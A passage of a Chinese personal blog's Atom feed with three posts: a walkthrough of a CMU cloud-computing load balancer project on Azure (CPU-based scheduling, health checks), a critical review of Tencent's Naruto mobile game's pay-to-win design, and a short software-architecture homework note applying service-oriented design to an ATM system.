<h3 id="u89E3_u9898_u6B65_u9AA4"><a href="#u89E3_u9898_u6B65_u9AA4" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>先用之前的代码复制镜像，然后开启 1 个 Load Balancer，1 个 Load Generator 和 3 个 Data Center。然后 SSH 到 Load Balancer 上：<code>ssh ubuntu@lbvmwdx.eastus.cloudapp.azure.com</code> 密码是 <code>Cloud@123</code>。然后我们把项目代码拷贝回本地 <code>scp -r ubuntu@yourdns.eastus.cloudapp.azure.com:~/Project22/* ./</code></p>
<p>接着大概观察一下代码，主要做两件事情：</p>
<ol>
<li>把 Data Center 的 DNS 填到 <code>Main.java</code> 中</li>
<li>补充完全 <code>LoadBalancer.java</code> 中的 <code>start()</code> 方法</li>
</ol>
<p>这里注意以下几个地方：</p>
<ol>
<li><code>LoadBalancer</code> 类在被创建的时候就把 <code>instances</code> 的列表传进来了，直接调用即可</li>
<li>默认是把所有请求都发给第一个 Data Center 的，只需要改一下这里的索引就好。</li>
<li>修改完成之后整个文件夹上传回去 <code>scp -r ./* ubuntu@yourdns.eastus.cloudapp.azure.com:~/Project22/</code></li>
<li>提交 dns 的时候，不用前面的 <code>http</code> 和最后的 <code>/</code> 之类的，注意下格式</li>
</ol>
<p>接着就和前面任务列表中的一致了，这里不赘述。</p>
<h2 id="u6539_u8FDB_u8D1F_u8F7D_u5747_u8861_u5668_u7B56_u7565"><a href="#u6539_u8FDB_u8D1F_u8F7D_u5747_u8861_u5668_u7B56_u7565" class="headerlink" title="改进负载均衡器策略"></a>改进负载均衡器策略</h2><p>下一个任务是开发一个负载均衡的策略，以便通过 自定调度算法测试。</p>
<p>可以通过 <code>http://[data center virtual machine dns]:8080/info/cpu</code> 来了解 data center 的 CPU 使用情况，能否通过这个方法，来通过测试呢？</p>
<h3 id="u4EFB_u52A1_u5217_u8868-1"><a href="#u4EFB_u52A1_u5217_u8868-1" class="headerlink" title="任务列表"></a>任务列表</h3><ol>
<li>在 Azure 中启动一台 load balancer 虚拟机</li>
<li>SSH 到 load balancer 上(用户名 <code>ubuntu</code>, 密码 <code>Cloud@123</code>)，需要做的内容在 <code>/home/ubuntu/Project22/</code> 文件夹中</li>
<li>补充完整 <code>LoadBalancer.java</code> 中的 <code>start()</code> 方法，使其可以通过查询 CPU 使用率的方式给已连接的实例分配负载，完成之后使用 <code>javac *.java</code> 来进行编译 </li>
<li>如果你确定自己的代码是对的，那么开启三个 data center 虚拟机，并在 <code>Main.java</code> 中填写的 <code>http://[your DC DNS]</code> 里填好对应的 DNS 地址</li>
<li>使用 <code>./run</code> 来执行你的代码</li>
<li>可以在浏览器中访问 <code>http://[your load balancer DNS]</code> 看到测试 UI</li>
<li>确定 load balancer 的自定义调度算法没有问题后，开启一个 load generator 虚拟机</li>
<li>开始 自定义调度算法 测试，目标是达到平均每秒 41 的 RPS</li>
<li>访问 <code>http://[your DC DNS]:8080/info/cpu</code> 来查看 data center 的 CPU 使用率</li>
</ol>
<p>负载是否均衡？在这个测试中，你的算法是一个好的策略吗？</p>
<h3 id="u7591_u96BE_u6742_u75C7"><a href="#u7591_u96BE_u6742_u75C7" class="headerlink" title="疑难杂症"></a>疑难杂症</h3><p>这里我遇到一个问题，就是 RPS 一直徘徊在 21 左右，死活上不去。我觉得可能是以下几个问题：</p>
<ol>
<li>Load Generator 发送请求不正常，因为之前强行停止过测试，不知道有没有影响</li>
<li>Load Balancer 判断的时候花费的时间太长，如果是这样的话需要优化代码</li>
<li>发送请求的间隔数目可能太小，导致检查过于频繁</li>
</ol>
<p>我觉得很可能是第二个，因为总是能看到选择的 Data Center 的 CPU 使用率为 0，估计是 Load Generator 分发不够快所致。不过我们还是一个一个来试一次</p>
<ol>
<li>重启之后发现并没有什么影响，还是处于比较低的 RPS，所以可以先试试看修改间隔数目</li>
<li>间隔数目改成 20 之后并没有特别大的改变，所以可以确定是 Load Balancer 的问题</li>
<li>经过问同学和排查，发现了问题所在，需要在选择最空闲的机器之后，继续使用 round robin 的策略</li>
</ol>
<p>然后问题得以解决。</p>
<h2 id="u76D1_u63A7_Data_Center__u7684_u72B6_u6001"><a href="#u76D1_u63A7_Data_Center__u7684_u72B6_u6001" class="headerlink" title="监控 Data Center 的状态"></a>监控 Data Center 的状态</h2><p>下一步是让我们的 Load Balancer 能够处理某个 Data Center 挂掉的情况。一旦某个虚拟机挂掉，就开启一个新的，用以代替旧的。</p>
<p>可以通过发送 HTTP 请求来查看 Data Center 的状况，只有返回 200 的时候，才认为它是在工作的。</p>
<h3 id="u4EFB_u52A1_u5217_u8868-2"><a href="#u4EFB_u52A1_u5217_u8868-2" class="headerlink" title="任务列表"></a>任务列表</h3><ol>
<li>在 Azure 中启动一台 load balancer 虚拟机</li>
<li>SSH 到 load balancer 上(用户名 <code>ubuntu</code>, 密码 <code>Cloud@123</code>)，需要做的内容在 <code>/home/ubuntu/Project22/</code> 文件夹中</li>
<li>实现带有健康检查的负载均衡器，也就是说，能检测出机器挂掉并停止向其发送请求，然后开启一个新的虚拟机，直到它能工作时，就用新的代替旧的。</li>
<li>完成之后使用 <code>javac *.java</code> 来进行编译</li>
<li>如果你确定自己的代码是对的，那么开启三个 data center 虚拟机，并在 <code>Main.java</code> 中填写的 <code>http://[your DC DNS]</code> 里填好对应的 DNS 地址</li>
<li>使用 <code>./run</code> 来执行你的代码</li>
<li>可以在浏览器中访问 <code>http://[your load balancer DNS]</code> 看到测试 UI</li>
<li>确定 load balancer 的自定义调度算法以及健康检查没有问题后，开启一个 load generator 虚拟机</li>
<li>开始 自定义调度算法+健康检查 测试，目标是达到平均每秒 41 的 RPS</li>
<li>一切完成之后可以进入最后的测试，目标是 30 RPS</li>
</ol>
<p>所有测试结束之后，关闭除了 load generator 的其他虚拟机，然后上传代码，包括 <code>/home/ubuntu/Project22</code> 下的所有 java 文件和 <code>references</code> 文件。上传完毕之后可以关闭 load generator</p>
<blockquote>
<p>提示</p>
</blockquote>
<p>可以用 <code>[dns of a virtual machine]/lookup/random</code> 作为健康检查的链接</p>
<p>在 <code>pom.xml</code> 中配置好</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">sourceDirectory</span>&gt;</span><span class="tag">&lt;/<span class="title">sourceDirectory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">outputDirectory</span>&gt;</span><span class="tag">&lt;/<span class="title">outputDirectory</span>&gt;</span></span><br><span class="line">        ....</span><br><span class="line"><span class="tag">&lt;<span class="title">build</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>就可以编译同一层级的文件了，注意要把 <code>run</code> 文件改为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="shebang">#!/bin/bash</span></span><br><span class="line">rm *.class</span><br><span class="line">mvn compile &amp;&amp; sudo mvn <span class="built_in">exec</span>:java -Dexec.mainClass=<span class="string">"Main"</span></span><br></pre></td></tr></table></figure>
<p>性能优化考虑：</p>
<ol>
<li>去掉测试用的输出语句，会比较影响性能</li>
<li>Health Check 测试中会挂掉其中两台 DC，其中间隔 6 分钟左右（第 6 分钟，第 12 分钟），注意可能出现的异常情况</li>
<li>一旦发送请求给挂了的机器，因为需要等待 Timeout，所以会占用很多时间，但是其实很难避免发送请求给已挂的机器，除非增加健康检查的间隔，但是增加间隔本身也会</li>
<li>每次访问实际上会调用两次 <code>start()</code> 函数，注意这里可能会导致一些问题；网络访问有比较多需要处理的异常，注意保证逻辑的一致性</li>
<li>选择下一个的时候性能太差，可能的话改动一下，应该一开始的 RPS 有 50 多</li>
<li>需要开新线程，<code>new Thread(new Runnable).start()</code></li>
<li>新开的机器各种不稳定，需要等待一段时间再进行查询</li>
</ol>
<h2 id="AWS_Bonus"><a href="#AWS_Bonus" class="headerlink" title="AWS Bonus"></a>AWS Bonus</h2><p>在 AWS 上完成前面的三个任务，这里不再重复任务描述。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>上一讲中我们接触负载均衡器，并且通过一个模拟实验进行了基本的体验，这节课我们通过 Azure 来探索一下负载均衡器的工作原理。</p>]]>
    
    </summary>
    
      <category term="AWS" scheme="http://wdxtub.com/tags/AWS/"/>
    
      <category term="Azure" scheme="http://wdxtub.com/tags/Azure/"/>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="云计算" scheme="http://wdxtub.com/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
      <category term="负载均衡器" scheme="http://wdxtub.com/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%99%A8/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[【火影忍者】一半良心，一半黑心]]></title>
    <link href="http://wdxtub.com/2016/02/07/naruto-ios/"/>
    <id>http://wdxtub.com/2016/02/07/naruto-ios/</id>
    <published>2016-02-08T04:17:34.000Z</published>
    <updated>2016-02-08T06:15:53.000Z</updated>
    <content type="html"><![CDATA[<p>当我们慢慢接受『免费玩家』没人权这样的游戏规则时，火影忍者手游跳出来告诉大家：不多花点钱，你还是没人权。一款制作精良的游戏却处处故意让玩家感到憋屈，先端上来满汉全席，然后故意往里面扔老鼠屎，这个饭店到底是图啥呢？</p>
<a id="more"></a>
<hr>
<p>『火影忍者』对于我来说，与其说是一部漫画作品，一部动画作品，更多是那些年中二的自己留下的回忆。但是在微信的游戏中心里看到『火影忍者』官方授权的手游，我的心情是复杂的。毕竟大家都知道，腾讯的作风基本上可以用六个字总结——『不充值，无游戏』。</p>
<p>截至今天，我所在的服务最高的等级是 58 级，我作为非 RMB 玩家坚持到了 53 级，应该也有一定的发言权了。至于为什么没有彻底通关后再动笔，实在是因为春节活动『恶心』到我了，『充值有积分，积分换奖品』，罢了，我去买 PS4 上原汁原味的火影忍者好了（过两天发售）。</p>
<p>看到下面的主界面，大概就能体会到『想钱想疯了』的感觉。体力、金钱旁边的加号是充钱的地方就算了，旁边的 V0（VIP 等级）、活动、招募、商城全都是要玩家花钱的地方，这还不过瘾，直接两个大大的『充值』往上一摆，得了，没钱的咱们不伺候哟！</p>
<p><img src="/images/IMG_2763.jpg" alt="主界面"></p>
<p>（但是无论是图标还是整体的界面设计都是非常好的，相信看过动画漫画的朋友都能感受到，这个不黑不吹，顶尖）</p>
<h2 id="u753B_u9762_u53CA_u58F0_u4E50"><a href="#u753B_u9762_u53CA_u58F0_u4E50" class="headerlink" title="画面及声乐"></a>画面及声乐</h2><p>因为有了官方的授权以及提供的素材，无论是场景动作忍术特效过场动画还是配音音效都是百分百原汁原味，有些剧情限定的关卡真的是让人玩得仿佛回到过去。再加上美术人员细致的加工处理，一招一式，有板有眼。</p>
<p><img src="/images/IMG_2783.jpg" alt="过场动画"></p>
<p>可是你若是不充钱，可能就得像我一样每天重复去完成各种各样的任务，提高自己的战斗力，然后才能接着把剧情继续下去。虽然剧情的进展非常缓慢，基本上满级也才刚刚到纲手当上火影的剧情。可是，这也许是唯一让我坚持下去的理由了，可是，原本可以做得更好的，不是吗？</p>
<h2 id="u5FCD_u8005_u53CA_u6218_u6597"><a href="#u5FCD_u8005_u53CA_u6218_u6597" class="headerlink" title="忍者及战斗"></a>忍者及战斗</h2><p>因为剧情还处于前中期阶段，所以登场的都是大家熟悉的下忍加上几个中坚力量（比如卡卡西）。不过考虑到这是第一部，腾讯之后完全可以出个疾风传什么的新游戏，让大家再来从头充一次钱。</p>
<p><img src="/images/IMG_2787.jpg" alt="忍者列表"></p>
<p>不过对于出场的忍者，还原度很高，手感也不错，不会给人只是换个贴图其他都一样的感觉，比方说不同的攻击范围和判定，不同的技能指向和伤害模式。让我觉得很有趣的是雏田的『白眼』技能，开启之后屏幕进入『白眼』模式，并且所有的普攻和技能都百分百暴击。</p>
<p><img src="/images/IMG_2786.jpg" alt="剧情限定"></p>
<p>很多传奇忍者，例如上图中的这仨，在剧情限定关卡中，也有机会使用，甚至还有配合召唤兽的战斗，虽然触屏战斗或多或少让人出戏，但是不得不说，我还是要给 9 分，剩下 1 分怕忍者们骄傲。</p>
<p><img src="/images/IMG_2785.jpg" alt="战斗画面"></p>
<p>战斗就没有主界面这么拖泥带水了，普通攻击 + 两个基本技能 + 大招 + 卷轴技能 + 召唤兽，就是全部的攻击方式了，当然不想自己这么累，左上角也可以自动。战斗的模式主要有三种，第一种就是图中所示的，抵御 4 波敌人；第二种是在限定时间清除场景中的敌人；最后一种就是和 Boss 单挑了。在单挑模式下会多一个『替身术』的技能（就是用一截木头代替自己吃技能），不过无伤大雅，反正最后都可以自动。</p>
<p>另外一个值得一提的是组队 PK 模式，但是默认是自动的，如下图（感谢不知道是谁的老瞎眼同学）：</p>
<p><img src="/images/IMG_2782.jpg" alt="组队战斗"></p>
<p>自动打自动，赢了加分输了减分，玩家看个热闹，基本就是这样了。当然不同的关卡可能会有一些微小的差异，比如说大石头堵路（可以打爆）或者大雾弥漫，但是总体的模式就三种，并没有脱离传统 PVP/PVE 的设定，没有耐心的玩家，可能上手第二条就会开始全程自动了。</p>
<p>还有一些属性是和忍者无关的，比方说天赋、装备、通灵术、勾玉、秘卷（也就是卷轴忍术）和神器（主要用来坑钱）。天赋部分比较简单，没啥可选择的，就是剧情过一关可以花一堆金币点一次天赋。装备和勾玉这个黄金搭档则是氪金组合。</p>
<p><img src="/images/IMG_2765.jpg" alt="装备"></p>
<p><img src="/images/IMG_2767.jpg" alt="勾玉"></p>
<p>装备需要材料进行升级和进阶，这些都可以挂机取得，操作很傻瓜，基本就是体力换装备，人民币换体力。比较坑的是这个勾玉，首先勾玉至少有六个等级，每三个低等级的可以合成一个高等级的，但是，注意这个但是，合成之后只提高两倍的属性。</p>
<p>举个例子，假设你有 3 个加攻击的 1 级红勾玉，每个 +5 点攻击，但是合成变为 2 级红勾玉之后，只 +10 点攻击力。那么问题就来了，如果这样一路升级到 6 级红勾玉，就合成这一项，玩家要被『火耗』多少呢？我们来算一下：</p>
<ul>
<li>1 个 6 级红勾玉 = 3 个 5 级红勾玉 = 9 个 4 级红勾玉 = … = 243 个 1 级红勾玉</li>
<li>1 个 1 级红勾玉 = 5 攻击力（用上面的假设）</li>
<li>1 个 6 级红勾玉 = 160 攻击力</li>
<li>243 个 1 级红勾玉 = 1215 攻击力</li>
</ul>
<p>也就是说，通过合成，你的攻击力从原本可以加 1215 变成了 160。你™在逗我，真的，不带这么坑的。</p>
<p>召唤兽和秘卷还算是中规中矩，至少都是拿多少钱办多少事儿，数值也还算合理，至少我这个免费玩家也能比较顺利升级（但是有些高级的就只能用钱买，呵呵）</p>
<p><img src="/images/IMG_2766.jpg" alt="通灵术"></p>
<p><img src="/images/IMG_2768.jpg" alt="秘卷"></p>
<p>最后就是这个『神器』部分了，这个真的是为了坑人才设计出来的，不信我们来看看。</p>
<p><img src="/images/IMG_2769.jpg" alt="神器"></p>
<p>首先，原著里什么时候出现过所谓幌金绳，不过我现在明白了，晃的是玩家口袋里的金，真是恶意满满的名字。需要升级不说，升级所用的还是游戏里最贵的资源，然后，每个『神器』有三个可以镶嵌的位置，每个位置有三个属性，这三个属性是可以『洗炼』的，好了，这下玩家们为了更高更快更强，开始砸钱和随机数玩游戏吧。</p>
<p>我还能说什么？我™都升到 59 级了！</p>
<h2 id="u6A21_u5F0F"><a href="#u6A21_u5F0F" class="headerlink" title="模式"></a>模式</h2><p>游戏中的模式还是比较丰富的，剧情模式名为冒险副本。旁边的精英副本，是掉落忍者碎片的地方。</p>
<p><img src="/images/IMG_2773.jpg" alt="冒险副本"></p>
<p>这个忍者碎片就有讲究了，获得一个 C 级忍者（也就是最差的），要十个碎片，然后升级需要 30 个，再之后是 60。正常免费游戏节奏，大概每天你能获得 4-8 个不同忍者的碎皮，喜欢夕日红？对不起，你得花钱抽，除了普通招募，还有高级招募，反正就是一个字——钱。</p>
<p><img src="/images/IMG_2774.jpg" alt="精英副本"></p>
<p>更搞笑的是，花了钱，可能还是不行。比方说限定招募，还必须要要 V7 特权，从特权 V0（也就是我现在），充值到 V7，真是人傻钱多速来，不带这么践踏我对火影的爱的。</p>
<p><img src="/images/IMG_2771.jpg" alt="忍者招募"></p>
<p>配套的排行榜和竞技场，也就是给 大RMB 玩家一个殴打免费玩家或者 小RMB 玩家的地方，再加上海外的线路延迟 500ms 以上，基本上我都是不知道发生啥就被打死，这游戏太难玩。</p>
<p><img src="/images/IMG_2777.jpg" alt="决斗场 PVP"></p>
<p>剩余的模式基本上就是给玩家一个把时间和金钱转换成游戏中资源的场所，不是为了完成每日任务，我是碰都不会碰的。</p>
<p><img src="/images/IMG_2776.jpg" alt="忍者组织"></p>
<p>组织就是类似与部落的地方，有一些额外的副本，和为组织祈福的任务，当然了，总而言之还是那六个字：『无充值，不游戏』</p>
<p>游戏中的资源其实来来去去大概就三种吧，但是玩着玩着就会发现，不是缺这个就是缺那个。370 万金币那都不是事儿（就是我截图中的金币数目），要知道现在升级一点天赋，就要差不多 20 万，我觉得完全可以去掉『万』字，让玩家知道自己穷得 有多可怜。</p>
<h2 id="u603B_u8BC4"><a href="#u603B_u8BC4" class="headerlink" title="总评"></a>总评</h2><p>在做游戏上，腾讯旗下的工作室有几把刷子，完成度高，没啥 bug，各个系统和模式大而全，尽量覆盖了所有的玩家类型，但是真的，做游戏是需要钱，但是接着大家的喜爱和情怀，人为恶意制造麻烦不让玩家玩得痛快，迟早会被玩家所抛弃。游戏明明是第九艺术，怎么到了腾讯手里就成了坑钱的法宝呢？</p>
<p>估计很长一段时间不会再碰腾讯出的手游了，操心，闹心，甚至有点恶心。</p>
<p>参考 FAMI通 的评分标准</p>
<ul>
<li>画面: 9 (原汁原味的火影体验）</li>
<li>音乐: 7 (就是那些年的味道，但是背景音乐有些单调)</li>
<li>操作: 5 (作为一个挂机游戏，其实没啥操作好谈的，技能好了就戳，就酱)</li>
<li>故事: 7 (剧情太慢，故意不让玩家玩剧情，虽然不少地方地处理颇为画龙点睛)</li>
<li>乐趣: 3 (无充值，不游戏，给 3 分真的已经是看情怀)</li>
</ul>
<p>总评: 8 - 4 = 4 (不差钱的话—— 8 分，普通玩家的话—— 4 分，因为最初的乐趣都会被一心朝钱看的嘴啃得渣都不剩)</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>当我们慢慢接受『免费玩家』没人权这样的游戏规则时，火影忍者手游跳出来告诉大家：不多花点钱，你还是没人权。一款制作精良的游戏却处处故意让玩家感到憋屈，先端上来满汉全席，然后故意往里面扔老鼠屎，这个饭店到底是图啥呢？</p>]]>
    
    </summary>
    
      <category term="人民币玩家" scheme="http://wdxtub.com/tags/%E4%BA%BA%E6%B0%91%E5%B8%81%E7%8E%A9%E5%AE%B6/"/>
    
      <category term="手游" scheme="http://wdxtub.com/tags/%E6%89%8B%E6%B8%B8/"/>
    
      <category term="火影忍者" scheme="http://wdxtub.com/tags/%E7%81%AB%E5%BD%B1%E5%BF%8D%E8%80%85/"/>
    
      <category term="网游" scheme="http://wdxtub.com/tags/%E7%BD%91%E6%B8%B8/"/>
    
      <category term="腾讯" scheme="http://wdxtub.com/tags/%E8%85%BE%E8%AE%AF/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[软件架构与设计 习题课 4 面向服务系统架构设计]]></title>
    <link href="http://wdxtub.com/2016/02/07/sad-r4/"/>
    <id>http://wdxtub.com/2016/02/07/sad-r4/</id>
    <published>2016-02-08T02:28:50.000Z</published>
    <updated>2016-02-08T04:07:29.000Z</updated>
    <content type="html"><![CDATA[<p>这一次的作业，是结合面向服务架构设计的思想，来优化我们之前的 ATM 设计。这次只需要围绕一个主题来思考，所以会稍微深入一些。</p>
<a id="more"></a>
<hr>
<h2 id="u7CFB_u7EDF_u4E2D_u7684_u5546_u52A1_u670D_u52A1_u4E0E_u53EF_u91CD_u7528_u670D_u52A1"><a href="#u7CFB_u7EDF_u4E2D_u7684_u5546_u52A1_u670D_u52A1_u4E0E_u53EF_u91CD_u7528_u670D_u52A1" class="headerlink" title="系统中的商务服务与可重用服务"></a>系统中的商务服务与可重用服务</h2><p>之前的作业中，我主要是在 ATM 的设计上尝试不同的架构风格。不同的架构风格均有其优势和劣势，经过一些简单的分析，我得到了如下结论：之所以会出现这种情况，是因为各种架构风格都针对某一类具体的问题，并且试图给出完美的解决方案。但是完美常常也是脆弱的，虽然每个组件都是自洽的，但是他们之间没有一个通用的沟通方式（尤其是在需要进行逻辑调整的时候）</p>
<p>SOA 可以是用另一种不同的思路来解决这个问题。通过把不同的功能切分成不同类别的服务。这些服务可以通过一个通用的协议来进行重组和复用。所以我也视图把我的设计往这个方向上靠。经过这样的改动，可以方便地通过配置文件来修改业务逻辑，而无须对代码进行改动。</p>
<p>商务服务和可重用的服务主要有：</p>
<ul>
<li>用户验证服务</li>
<li>卡/支票验证服务</li>
<li>查询服务</li>
<li>转账服务</li>
<li>存款服务</li>
<li>异常处理服务</li>
<li>打印服务</li>
<li>等等</li>
</ul>
<h2 id="u7CFB_u7EDF_u5206_u5C42_u8BBE_u8BA1"><a href="#u7CFB_u7EDF_u5206_u5C42_u8BBE_u8BA1" class="headerlink" title="系统分层设计"></a>系统分层设计</h2><p>根据上面的说明，大致的分层设计为：</p>
<p><img src="/images/14549044328044.jpg" alt=""></p>
<p>我感觉还是比较一目了然的，这里就不再赘述了</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这一次的作业，是结合面向服务架构设计的思想，来优化我们之前的 ATM 设计。这次只需要围绕一个主题来思考，所以会稍微深入一些。</p>]]>
    
    </summary>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
</feed>
